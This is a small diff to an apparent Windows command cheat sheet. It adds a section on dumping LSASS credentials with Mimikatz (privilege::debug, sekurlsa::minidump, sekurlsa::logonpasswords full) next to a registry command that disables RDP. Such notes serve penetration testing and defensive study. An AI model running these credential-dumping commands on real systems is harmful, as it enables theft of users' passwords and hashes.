@@ -24,3 +24,10 @@ date: 2022-12-10
 ### Disable RDP From Regedit
 
     reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 1 /f
+    
+### Lsass Dump via Mimikatz
+
+    privilege::debug
+    sekurlsa::minidump file.DMP (If there is a DMP file)
+    sekurlsa::logonpasswords full
+    
